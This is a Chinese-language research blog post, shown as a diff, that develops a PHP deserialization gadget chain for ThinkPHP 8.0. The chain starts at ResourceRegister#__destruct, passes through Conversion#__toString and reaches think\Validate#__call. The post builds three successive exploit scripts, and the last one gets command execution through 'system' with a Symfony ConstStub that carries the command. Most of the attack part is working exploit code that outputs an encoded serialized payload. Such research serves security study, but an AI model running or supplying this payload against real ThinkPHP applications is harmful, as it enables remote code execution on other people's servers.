@@ -1,0 +1,294 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<h3 data-content="1" id="250c0f3a4f4662c757662ba712319dc6">前言</h3>
+<p>去年暑假，ThinkPHP发布了8.0版本。当时也是尝试着挖掘一条反序列化调用链，相比ThinkPHP 6，不少类做了变动，外加上还做了<code>declare (strict_types = 1);</code>的限制，让利用变的有些许的难。</p>
+<p>最近还是将这个任务重新捡了起来，最后也是成功找到了一条调用链并成功利用，这里就分享成功利用的部分。</p>
+<h3 data-content="1" id="e6aaae51b5d74f4470e9f48faa9b33de">环境说明</h3>
+<p>官方手册：<a href="https://doc.thinkphp.cn/v8_0/preface.html" target="_blank">https://doc.thinkphp.cn/v8_0/preface.html</a></p>
+<p>此外ThinkPHP提高了PHP版本要求，PHP版本需要使用PHP8以上。根据官方文档下载好后添加一个反序列化入口就好</p>
+<h3 data-content="1" id="5805a8c460f5a5c0665140768c2e7f41">反序列化调用链</h3>
+<p><strong>source点选择</strong></p>
+<p>反序列化起点无非是<strong>destruct或</strong>wakeup方法，<strong>wakeup一般用于作对象初始化，多选择</strong>destruct方法作为起点</p>
+<p>全局一找，发现仅有两个可选</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240623140523-93d8f4ec-3126-1.png"/></p>
+<p>先看第一个，这是应该是给数据库关闭链接用的，定义在Connection抽象类中，该类实现ConnectionInterface接口，__destruct方法调用的是接口中的close方法，这里想利用需要寻找其子类</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240623140543-a011cf18-3126-1.png"/></p>
+<p>这两个类的close方法都是些赋值语句，不适合作为source点</p>
+<p>所以只能将目光放在ResourceRegister#__destruct方法上</p>
+<p><strong>sink点选择</strong></p>
+<p>大多框架的反序列化sink点会选择<strong>call方法，一般可能的危险操作都在</strong>call方法上，当然也要找变量可控较多且可利用的（method大多不可控了）</p>
+<p>这里我选的think\Validate#__call，也是ThinkPHP6反序列化调用链中会选的sink，当然应该也可以选别个</p>
+<p><strong>调用链挖掘</strong></p>
+<p>选好了sink和source，这样就不会像无头苍蝇，在调用链选择上尽量往我们的sink点靠就好啦，这里先做简单理论</p>
+<p>先从source点开始跟</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240623140600-aa617edc-3126-1.png"/></p>
+<p>registered可控，为false会调用register方法</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240623140629-bb531c32-3126-1.png"/></p>
+<p>resource可控，可以看到这里就能尝试去触发<strong>call方法，但是getRule方法是无参的，没有办法控制</strong>call方法中的$args参数</p>
+<p>这里选择往下调用parseGroupRule方法，getRule方法返回值可控，该方法下个人感觉可利用的点不多，但可以利用字符串拼接触发__toString（由于做了类型限制，就不能选择一些字符串处理函数来触发）</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240623140716-d75b3158-3126-1.png"/></p>
+<p>rest、last、option都是可控的，这里可以通过字符串拼接的方式触发__toString</p>
+<p>下面就是<strong>toString的选择，能用的也不多，这里我选的是think\model\concern\Conversion#</strong>toString方法</p>
+<p>一路走过来会调用appendAttrToArray方法</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240623140731-e0506562-3126-1.png"/></p>
+<p>这里我选择在getRelationWith方法中触发__call方法</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240623140744-e86014c8-3126-1.png"/></p>
+<p>重点在$relation以及$visible[$key]的控制，后面再讲诉</p>
+<p>那这里自然而然就能调用到__call方法，也就是我们的sink点</p>
+<p>这里贴一个我成功利用的调用栈</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240623140800-f171f96e-3126-1.png"/></p>
+<p>最后在匿名函数通过call_user_func_array实现代码执行</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240623140812-f8c7fc04-3126-1.png"/></p>
+<p>type也是可控的</p>
+<h3 data-content="1" id="2d3833858fcbdc12a1f5813e68ff8a3e">构造exp</h3>
+<p>我喜欢边构造边调试分析，先从source开始</p>
+<p>registered默认为false，可以不管，前面我说到了我们要利用parseGroupRule方法，我们需要构建一个think\route\Resource对象</p>
+<p>先简单构造一下进行调试</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240623140825-00cce176-3127-1.png"/></p>
+<p>首先$rule不能为null，last来源于$rule分割后的最后一个元素</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240623140913-1d08d85e-3127-1.png"/></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240623141008-3dbe27e8-3127-1.png"/></p>
+<p>同理$name和$rest也是，否则都是利用不了滴，还用确保不被continue，不处理$option['only']就行</p>
+<p>利用条件$val[1]需要包含<code>&lt;id&gt;</code>，且$option['var'][$last]不为空，这里就是我们要触发的__toString所对应的对象</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240623141036-4eb1d6ee-3127-1.png"/></p>
+<p>于是构造出</p>
+<div class="highlight"><pre><span></span><span class="o">&lt;?</span><span class="n">php</span>
+<span class="n">namespace</span> <span class="n">think</span><span class="err">\</span><span class="n">route</span><span class="o">{</span>
+    <span class="kd">class</span> <span class="nc">ResourceRegister</span><span class="o">{</span>
+        <span class="kd">public</span> <span class="n">$resource</span><span class="o">;</span>
+
+        <span class="kd">public</span> <span class="n">function</span> <span class="nf">__construct</span><span class="o">(</span><span class="n">$resource</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">$this</span><span class="o">-&gt;</span><span class="n">resource</span> <span class="o">=</span> <span class="n">$resource</span><span class="o">;</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+
+    <span class="kd">class</span> <span class="nc">RuleGroup</span> <span class="kd">extends</span> <span class="n">Rule</span><span class="o">{</span>
+        <span class="kd">public</span> <span class="n">function</span> <span class="nf">__construct</span><span class="o">(</span><span class="n">$rule</span><span class="o">,</span> <span class="n">$router</span><span class="o">,</span> <span class="n">$option</span><span class="o">){</span>
+            <span class="n">parent</span><span class="o">::</span><span class="n">__construct</span><span class="o">(</span><span class="n">$rule</span><span class="o">,</span> <span class="n">$router</span><span class="o">,</span> <span class="n">$option</span><span class="o">);</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+
+    <span class="kd">class</span> <span class="nc">Resource</span> <span class="kd">extends</span> <span class="n">RuleGroup</span><span class="o">{</span>
+        <span class="kd">public</span> <span class="n">function</span> <span class="nf">__construct</span><span class="o">(</span><span class="n">$rule</span><span class="o">,</span> <span class="n">$router</span><span class="o">,</span> <span class="n">$option</span><span class="o">){</span>
+            <span class="n">parent</span><span class="o">::</span><span class="n">__construct</span><span class="o">(</span><span class="n">$rule</span><span class="o">,</span> <span class="n">$router</span><span class="o">,</span> <span class="n">$option</span><span class="o">);</span>
+        <span class="o">}</span>
+
+    <span class="o">}</span>
+
+    <span class="kd">abstract</span> <span class="kd">class</span> <span class="nc">Rule</span><span class="o">{</span>
+        <span class="kd">public</span> <span class="n">$rest</span> <span class="o">=</span> <span class="o">[</span><span class="err">'</span><span class="n">key</span><span class="err">'</span> <span class="o">=&gt;</span> <span class="o">[</span><span class="mi">1</span> <span class="o">=&gt;</span> <span class="err">'</span><span class="o">&lt;</span><span class="n">id</span><span class="o">&gt;</span><span class="err">'</span><span class="o">]];</span>
+        <span class="kd">public</span> <span class="n">$name</span> <span class="o">=</span> <span class="s">"name"</span><span class="o">;</span>
+        <span class="kd">public</span> <span class="n">$rule</span><span class="o">;</span>
+        <span class="kd">public</span> <span class="n">$router</span><span class="o">;</span>
+        <span class="kd">public</span> <span class="n">$option</span><span class="o">;</span>
+
+        <span class="kd">public</span> <span class="n">function</span> <span class="nf">__construct</span><span class="o">(</span><span class="n">$rule</span><span class="o">,</span> <span class="n">$router</span><span class="o">,</span> <span class="n">$option</span><span class="o">){</span>
+            <span class="n">$this</span><span class="o">-&gt;</span><span class="n">rule</span> <span class="o">=</span> <span class="n">$rule</span><span class="o">;</span>
+            <span class="n">$this</span><span class="o">-&gt;</span><span class="n">router</span> <span class="o">=</span> <span class="n">$router</span><span class="o">;</span>
+            <span class="n">$this</span><span class="o">-&gt;</span><span class="n">option</span> <span class="o">=</span> <span class="o">[</span><span class="err">'</span><span class="n">var</span><span class="err">'</span> <span class="o">=&gt;</span> <span class="o">[</span><span class="err">'</span><span class="n">nivia</span><span class="err">'</span> <span class="o">=&gt;</span> <span class="n">$option</span><span class="o">]];</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+
+<span class="n">namespace</span> <span class="n">think</span> <span class="o">{</span>
+    <span class="kd">class</span> <span class="nc">Route</span><span class="o">{}</span>
+    <span class="kd">abstract</span> <span class="kd">class</span> <span class="nc">Model</span><span class="o">{</span>
+        <span class="kd">protected</span> <span class="n">$append</span> <span class="o">=</span> <span class="o">[</span><span class="err">'</span><span class="n">Nivia</span><span class="err">'</span> <span class="o">=&gt;</span> <span class="s">"1.2"</span><span class="o">];</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+
+<span class="n">namespace</span> <span class="n">think</span><span class="err">\</span><span class="n">model</span><span class="o">{</span>
+    <span class="n">use</span> <span class="n">think</span><span class="err">\</span><span class="n">Model</span><span class="o">;</span>
+    <span class="kd">class</span> <span class="nc">Pivot</span> <span class="kd">extends</span> <span class="n">Model</span><span class="o">{}</span>
+<span class="o">}</span>
+
+<span class="n">namespace</span> <span class="o">{</span>
+    <span class="n">$option</span> <span class="o">=</span> <span class="k">new</span> <span class="n">think</span><span class="err">\</span><span class="n">model</span><span class="err">\</span><span class="n">Pivot</span><span class="o">;</span>
+    <span class="n">$router</span> <span class="o">=</span> <span class="k">new</span> <span class="n">think</span><span class="err">\</span><span class="n">Route</span><span class="o">;</span>
+    <span class="n">$resource</span> <span class="o">=</span> <span class="k">new</span> <span class="n">think</span><span class="err">\</span><span class="n">route</span><span class="err">\</span><span class="n">Resource</span><span class="o">(</span><span class="s">"abc.nivia"</span><span class="o">,</span> <span class="n">$router</span> <span class="o">,</span> <span class="n">$option</span><span class="o">);</span>
+    <span class="n">$resourceRegister</span> <span class="o">=</span> <span class="k">new</span> <span class="n">think</span><span class="err">\</span><span class="n">route</span><span class="err">\</span><span class="n">ResourceRegister</span><span class="o">(</span><span class="n">$resource</span><span class="o">);</span>
+    <span class="n">echo</span> <span class="nf">urlencode</span><span class="o">(</span><span class="n">base64_encode</span><span class="o">(</span><span class="n">serialize</span><span class="o">(</span><span class="n">$resourceRegister</span><span class="o">)));</span>
+<span class="o">}</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240623141056-5a9d733c-3127-1.png"/></p>
+<p>往下到think\model\concern\Conversion#__toString方法，个人认为这里比较恶心</p>
+<p>中间会调用appendAttrToArray方法，方法中还会调用getRelationWith方法，在这里有机会触发__call方法</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240623141111-6355ed24-3127-1.png"/></p>
+<p>关键在$relation和$visible[$key]的控制</p>
+<p>首先是$visible变量</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240623141128-6dd2b6e2-3127-1.png"/></p>
+<p>可以发现其第一层else语句中的赋值语句满足我们的要求，$this-&gt;visible可控，仅要求$val不能是字符串</p>
+<p>接下来看$relation，其变量来源于getRelation方法，受key影响</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240623141156-7e772ee2-3127-1.png"/></p>
+<p>$this-&gt;relation可控，key也可控但不为null，可以在第二个return中返回我们想要的值</p>
+<p>那就根据上述要求构造下一步exp，其中有一个点是刚才提到的$val不能是字符串，我首先想到的是用数组代替，根据一些相关要求有如下exp</p>
+<div class="highlight"><pre><span></span><span class="o">&lt;?</span><span class="n">php</span>
+<span class="n">namespace</span> <span class="n">think</span><span class="err">\</span><span class="n">route</span><span class="o">{</span>
+    <span class="kd">class</span> <span class="nc">ResourceRegister</span><span class="o">{</span>
+        <span class="kd">public</span> <span class="n">$resource</span><span class="o">;</span>
+
+        <span class="kd">public</span> <span class="n">function</span> <span class="nf">__construct</span><span class="o">(</span><span class="n">$resource</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">$this</span><span class="o">-&gt;</span><span class="n">resource</span> <span class="o">=</span> <span class="n">$resource</span><span class="o">;</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+
+    <span class="kd">class</span> <span class="nc">RuleGroup</span> <span class="kd">extends</span> <span class="n">Rule</span><span class="o">{</span>
+        <span class="kd">public</span> <span class="n">function</span> <span class="nf">__construct</span><span class="o">(</span><span class="n">$rule</span><span class="o">,</span> <span class="n">$router</span><span class="o">,</span> <span class="n">$option</span><span class="o">){</span>
+            <span class="n">parent</span><span class="o">::</span><span class="n">__construct</span><span class="o">(</span><span class="n">$rule</span><span class="o">,</span> <span class="n">$router</span><span class="o">,</span> <span class="n">$option</span><span class="o">);</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+
+    <span class="kd">class</span> <span class="nc">Resource</span> <span class="kd">extends</span> <span class="n">RuleGroup</span><span class="o">{</span>
+        <span class="kd">public</span> <span class="n">function</span> <span class="nf">__construct</span><span class="o">(</span><span class="n">$rule</span><span class="o">,</span> <span class="n">$router</span><span class="o">,</span> <span class="n">$option</span><span class="o">){</span>
+            <span class="n">parent</span><span class="o">::</span><span class="n">__construct</span><span class="o">(</span><span class="n">$rule</span><span class="o">,</span> <span class="n">$router</span><span class="o">,</span> <span class="n">$option</span><span class="o">);</span>
+        <span class="o">}</span>
+
+    <span class="o">}</span>
+
+    <span class="kd">abstract</span> <span class="kd">class</span> <span class="nc">Rule</span><span class="o">{</span>
+        <span class="kd">public</span> <span class="n">$rest</span> <span class="o">=</span> <span class="o">[</span><span class="err">'</span><span class="n">key</span><span class="err">'</span> <span class="o">=&gt;</span> <span class="o">[</span><span class="mi">1</span> <span class="o">=&gt;</span> <span class="err">'</span><span class="o">&lt;</span><span class="n">id</span><span class="o">&gt;</span><span class="err">'</span><span class="o">]];</span>
+        <span class="kd">public</span> <span class="n">$name</span> <span class="o">=</span> <span class="s">"name"</span><span class="o">;</span>
+        <span class="kd">public</span> <span class="n">$rule</span><span class="o">;</span>
+        <span class="kd">public</span> <span class="n">$router</span><span class="o">;</span>
+        <span class="kd">public</span> <span class="n">$option</span><span class="o">;</span>
+
+        <span class="kd">public</span> <span class="n">function</span> <span class="nf">__construct</span><span class="o">(</span><span class="n">$rule</span><span class="o">,</span> <span class="n">$router</span><span class="o">,</span> <span class="n">$option</span><span class="o">){</span>
+            <span class="n">$this</span><span class="o">-&gt;</span><span class="n">rule</span> <span class="o">=</span> <span class="n">$rule</span><span class="o">;</span>
+            <span class="n">$this</span><span class="o">-&gt;</span><span class="n">router</span> <span class="o">=</span> <span class="n">$router</span><span class="o">;</span>
+            <span class="n">$this</span><span class="o">-&gt;</span><span class="n">option</span> <span class="o">=</span> <span class="o">[</span><span class="err">'</span><span class="n">var</span><span class="err">'</span> <span class="o">=&gt;</span> <span class="o">[</span><span class="err">'</span><span class="n">nivia</span><span class="err">'</span> <span class="o">=&gt;</span> <span class="n">$option</span><span class="o">]];</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+
+<span class="n">namespace</span> <span class="n">think</span> <span class="o">{</span>
+    <span class="kd">class</span> <span class="nc">Route</span><span class="o">{}</span>
+    <span class="kd">abstract</span> <span class="kd">class</span> <span class="nc">Model</span><span class="o">{</span>
+        <span class="kd">private</span> <span class="n">$relation</span><span class="o">;</span>
+        <span class="kd">protected</span> <span class="n">$append</span> <span class="o">=</span> <span class="o">[</span><span class="err">'</span><span class="n">Nivia</span><span class="err">'</span> <span class="o">=&gt;</span> <span class="s">"1.2"</span><span class="o">];</span>
+
+        <span class="kd">protected</span> <span class="n">$visible</span><span class="o">;</span>
+
+        <span class="kd">public</span> <span class="n">function</span> <span class="nf">__construct</span><span class="o">(</span><span class="n">$visible</span><span class="o">,</span> <span class="n">$call</span><span class="o">){</span>
+            <span class="n">$this</span><span class="o">-&gt;</span><span class="n">visible</span> <span class="o">=</span> <span class="o">[</span><span class="mi">1</span> <span class="o">=&gt;</span> <span class="n">$visible</span><span class="o">];</span>
+            <span class="n">$this</span><span class="o">-&gt;</span><span class="n">relation</span> <span class="o">=</span> <span class="o">[</span><span class="sc">'1'</span> <span class="o">=&gt;</span> <span class="n">$call</span><span class="o">];</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+
+    <span class="kd">class</span> <span class="nc">Validate</span><span class="o">{}</span>
+<span class="o">}</span>
+
+<span class="n">namespace</span> <span class="n">think</span><span class="err">\</span><span class="n">model</span><span class="o">{</span>
+    <span class="n">use</span> <span class="n">think</span><span class="err">\</span><span class="n">Model</span><span class="o">;</span>
+    <span class="kd">class</span> <span class="nc">Pivot</span> <span class="kd">extends</span> <span class="n">Model</span><span class="o">{</span>
+
+    <span class="o">}</span>
+<span class="o">}</span>
+
+<span class="n">namespace</span> <span class="o">{</span>
+    <span class="n">$call</span> <span class="o">=</span> <span class="k">new</span> <span class="n">think</span><span class="err">\</span><span class="n">Validate</span><span class="o">;</span>
+    <span class="n">$option</span> <span class="o">=</span> <span class="k">new</span> <span class="n">think</span><span class="err">\</span><span class="n">model</span><span class="err">\</span><span class="n">Pivot</span><span class="o">([</span><span class="err">'</span><span class="n">ls</span><span class="err">'</span><span class="o">],</span> <span class="n">$call</span><span class="o">);</span>
+    <span class="n">$router</span> <span class="o">=</span> <span class="k">new</span> <span class="n">think</span><span class="err">\</span><span class="n">Route</span><span class="o">;</span>
+    <span class="n">$resource</span> <span class="o">=</span> <span class="k">new</span> <span class="n">think</span><span class="err">\</span><span class="n">route</span><span class="err">\</span><span class="n">Resource</span><span class="o">(</span><span class="s">"abc.nivia"</span><span class="o">,</span> <span class="n">$router</span> <span class="o">,</span> <span class="n">$option</span><span class="o">);</span>
+    <span class="n">$resourceRegister</span> <span class="o">=</span> <span class="k">new</span> <span class="n">think</span><span class="err">\</span><span class="n">route</span><span class="err">\</span><span class="n">ResourceRegister</span><span class="o">(</span><span class="n">$resource</span><span class="o">);</span>
+    <span class="n">echo</span> <span class="nf">urlencode</span><span class="o">(</span><span class="n">base64_encode</span><span class="o">(</span><span class="n">serialize</span><span class="o">(</span><span class="n">$resourceRegister</span><span class="o">)));</span>
+<span class="o">}</span>
+</pre></div>
+<p>最后也是成功调用到think\Validate#__call方法，方法会调用is方法</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240623141144-774d95ac-3127-1.png"/></p>
+<p>$this-&gt;type可控，$rule为调用触发__call的方法名，$value其实就是前面的$val</p>
+<p>这里会有一个问题就是这里的$value其实就是传给$this-&gt;type[$rule]的参数了，但$value前面分析过了它不能是字符串，本来想通过ReflectionFunction#invokeArgs来实现命令执行，且刚好invokeArgs接收一个数组类型的参数，但ReflectionFunction不允许被序列化和反序列化</p>
+<p>最后想到可以通过类的<strong>toString进行替换，在</strong>toString中返回我们想要的命令。</p>
+<h3 data-content="1" id="fedf87bcacc3644e3cfec3db21464c02">最终exp</h3>
+<div class="highlight"><pre><span></span><span class="o">&lt;?</span><span class="n">php</span>
+<span class="n">namespace</span> <span class="n">think</span><span class="err">\</span><span class="n">route</span><span class="o">{</span>
+    <span class="kd">class</span> <span class="nc">ResourceRegister</span><span class="o">{</span>
+        <span class="kd">public</span> <span class="n">$resource</span><span class="o">;</span>
+
+        <span class="kd">public</span> <span class="n">function</span> <span class="nf">__construct</span><span class="o">(</span><span class="n">$resource</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">$this</span><span class="o">-&gt;</span><span class="n">resource</span> <span class="o">=</span> <span class="n">$resource</span><span class="o">;</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+
+    <span class="kd">class</span> <span class="nc">RuleGroup</span> <span class="kd">extends</span> <span class="n">Rule</span><span class="o">{</span>
+        <span class="kd">public</span> <span class="n">function</span> <span class="nf">__construct</span><span class="o">(</span><span class="n">$rule</span><span class="o">,</span> <span class="n">$router</span><span class="o">,</span> <span class="n">$option</span><span class="o">){</span>
+            <span class="n">parent</span><span class="o">::</span><span class="n">__construct</span><span class="o">(</span><span class="n">$rule</span><span class="o">,</span> <span class="n">$router</span><span class="o">,</span> <span class="n">$option</span><span class="o">);</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+
+    <span class="kd">class</span> <span class="nc">Resource</span> <span class="kd">extends</span> <span class="n">RuleGroup</span><span class="o">{</span>
+        <span class="kd">public</span> <span class="n">function</span> <span class="nf">__construct</span><span class="o">(</span><span class="n">$rule</span><span class="o">,</span> <span class="n">$router</span><span class="o">,</span> <span class="n">$option</span><span class="o">){</span>
+            <span class="n">parent</span><span class="o">::</span><span class="n">__construct</span><span class="o">(</span><span class="n">$rule</span><span class="o">,</span> <span class="n">$router</span><span class="o">,</span> <span class="n">$option</span><span class="o">);</span>
+        <span class="o">}</span>
+
+    <span class="o">}</span>
+
+    <span class="kd">abstract</span> <span class="kd">class</span> <span class="nc">Rule</span><span class="o">{</span>
+        <span class="kd">public</span> <span class="n">$rest</span> <span class="o">=</span> <span class="o">[</span><span class="err">'</span><span class="n">key</span><span class="err">'</span> <span class="o">=&gt;</span> <span class="o">[</span><span class="mi">1</span> <span class="o">=&gt;</span> <span class="err">'</span><span class="o">&lt;</span><span class="n">id</span><span class="o">&gt;</span><span class="err">'</span><span class="o">]];</span>
+        <span class="kd">public</span> <span class="n">$name</span> <span class="o">=</span> <span class="s">"name"</span><span class="o">;</span>
+        <span class="kd">public</span> <span class="n">$rule</span><span class="o">;</span>
+        <span class="kd">public</span> <span class="n">$router</span><span class="o">;</span>
+        <span class="kd">public</span> <span class="n">$option</span><span class="o">;</span>
+
+        <span class="kd">public</span> <span class="n">function</span> <span class="nf">__construct</span><span class="o">(</span><span class="n">$rule</span><span class="o">,</span> <span class="n">$router</span><span class="o">,</span> <span class="n">$option</span><span class="o">){</span>
+            <span class="n">$this</span><span class="o">-&gt;</span><span class="n">rule</span> <span class="o">=</span> <span class="n">$rule</span><span class="o">;</span>
+            <span class="n">$this</span><span class="o">-&gt;</span><span class="n">router</span> <span class="o">=</span> <span class="n">$router</span><span class="o">;</span>
+            <span class="n">$this</span><span class="o">-&gt;</span><span class="n">option</span> <span class="o">=</span> <span class="o">[</span><span class="err">'</span><span class="n">var</span><span class="err">'</span> <span class="o">=&gt;</span> <span class="o">[</span><span class="err">'</span><span class="n">nivia</span><span class="err">'</span> <span class="o">=&gt;</span> <span class="n">$option</span><span class="o">]];</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+
+<span class="n">namespace</span> <span class="n">think</span> <span class="o">{</span>
+    <span class="kd">class</span> <span class="nc">Route</span><span class="o">{}</span>
+    <span class="kd">abstract</span> <span class="kd">class</span> <span class="nc">Model</span><span class="o">{</span>
+        <span class="kd">private</span> <span class="n">$relation</span><span class="o">;</span>
+        <span class="kd">protected</span> <span class="n">$append</span> <span class="o">=</span> <span class="o">[</span><span class="err">'</span><span class="n">Nivia</span><span class="err">'</span> <span class="o">=&gt;</span> <span class="s">"1.2"</span><span class="o">];</span>
+
+        <span class="kd">protected</span> <span class="n">$visible</span><span class="o">;</span>
+        <span class="kd">public</span> <span class="n">function</span> <span class="nf">__construct</span><span class="o">(</span><span class="n">$visible</span><span class="o">,</span> <span class="n">$call</span><span class="o">){</span>
+            <span class="n">$this</span><span class="o">-&gt;</span><span class="n">visible</span> <span class="o">=</span> <span class="o">[</span><span class="mi">1</span> <span class="o">=&gt;</span> <span class="n">$visible</span><span class="o">];</span>
+            <span class="n">$this</span><span class="o">-&gt;</span><span class="n">relation</span> <span class="o">=</span> <span class="o">[</span><span class="sc">'1'</span> <span class="o">=&gt;</span> <span class="n">$call</span><span class="o">];</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+
+    <span class="kd">class</span> <span class="nc">Validate</span><span class="o">{</span>
+        <span class="kd">protected</span> <span class="n">$type</span><span class="o">;</span>
+
+        <span class="kd">public</span> <span class="n">function</span> <span class="nf">__construct</span><span class="o">(){</span>
+            <span class="n">$this</span><span class="o">-&gt;</span><span class="n">type</span> <span class="o">=</span> <span class="o">[</span><span class="err">'</span><span class="n">visible</span><span class="err">'</span> <span class="o">=&gt;</span> <span class="s">"system"</span><span class="o">];</span><span class="c1">//function</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+
+<span class="n">namespace</span> <span class="n">think</span><span class="err">\</span><span class="n">model</span><span class="o">{</span>
+    <span class="n">use</span> <span class="n">think</span><span class="err">\</span><span class="n">Model</span><span class="o">;</span>
+    <span class="kd">class</span> <span class="nc">Pivot</span> <span class="kd">extends</span> <span class="n">Model</span><span class="o">{</span>
+        <span class="kd">public</span> <span class="n">function</span> <span class="nf">__construct</span><span class="o">(</span><span class="n">$visible</span><span class="o">,</span> <span class="n">$call</span><span class="o">){</span>
+            <span class="n">parent</span><span class="o">::</span><span class="n">__construct</span><span class="o">(</span><span class="n">$visible</span><span class="o">,</span> <span class="n">$call</span><span class="o">);</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+
+<span class="n">namespace</span> <span class="n">Symfony</span><span class="err">\</span><span class="n">Component</span><span class="err">\</span><span class="n">VarDumper</span><span class="err">\</span><span class="n">Caster</span><span class="o">{</span>
+    <span class="n">use</span> <span class="n">Symfony</span><span class="err">\</span><span class="n">Component</span><span class="err">\</span><span class="n">VarDumper</span><span class="err">\</span><span class="n">Cloner</span><span class="err">\</span><span class="n">Stub</span><span class="o">;</span>
+    <span class="kd">class</span> <span class="nc">ConstStub</span> <span class="kd">extends</span> <span class="n">Stub</span><span class="o">{}</span>
+<span class="o">}</span>
+
+<span class="n">namespace</span> <span class="n">Symfony</span><span class="err">\</span><span class="n">Component</span><span class="err">\</span><span class="n">VarDumper</span><span class="err">\</span><span class="n">Cloner</span><span class="o">{</span>
+    <span class="kd">class</span> <span class="nc">Stub</span><span class="o">{</span>
+        <span class="kd">public</span> <span class="n">$value</span> <span class="o">=</span> <span class="s">"open -a Calculator"</span><span class="o">;</span> <span class="c1">//cmd</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+
+<span class="n">namespace</span> <span class="o">{</span>
+    <span class="n">$call</span> <span class="o">=</span> <span class="k">new</span> <span class="n">think</span><span class="err">\</span><span class="n">Validate</span><span class="o">;</span>
+    <span class="n">$option</span> <span class="o">=</span> <span class="k">new</span> <span class="n">think</span><span class="err">\</span><span class="n">model</span><span class="err">\</span><span class="n">Pivot</span><span class="o">(</span><span class="k">new</span> <span class="n">Symfony</span><span class="err">\</span><span class="n">Component</span><span class="err">\</span><span class="n">VarDumper</span><span class="err">\</span><span class="n">Caster</span><span class="err">\</span><span class="n">ConstStub</span><span class="o">,</span> <span class="n">$call</span><span class="o">);</span>
+    <span class="n">$router</span> <span class="o">=</span> <span class="k">new</span> <span class="n">think</span><span class="err">\</span><span class="n">Route</span><span class="o">;</span>
+    <span class="n">$resource</span> <span class="o">=</span> <span class="k">new</span> <span class="n">think</span><span class="err">\</span><span class="n">route</span><span class="err">\</span><span class="n">Resource</span><span class="o">(</span><span class="s">"abc.nivia"</span><span class="o">,</span> <span class="n">$router</span> <span class="o">,</span> <span class="n">$option</span><span class="o">);</span>
+    <span class="n">$resourceRegister</span> <span class="o">=</span> <span class="k">new</span> <span class="n">think</span><span class="err">\</span><span class="n">route</span><span class="err">\</span><span class="n">ResourceRegister</span><span class="o">(</span><span class="n">$resource</span><span class="o">);</span>
+    <span class="n">echo</span> <span class="nf">urlencode</span><span class="o">(</span><span class="n">base64_encode</span><span class="o">(</span><span class="n">serialize</span><span class="o">(</span><span class="n">$resourceRegister</span><span class="o">)));</span>
+<span class="o">}</span>
+</pre></div>
+<h3 data-content="1" id="ec60c8d5c3998319ececa4bc12f872d3">结语</h3>
+<p>乍一看发现调用链似乎没这么难，但过程还是比较艰辛，中间也遇到很多坑，似乎感觉不可能，也尝试了很多种想法。也是体验了一把挖掘的感觉</p>
+</div>
+</div>
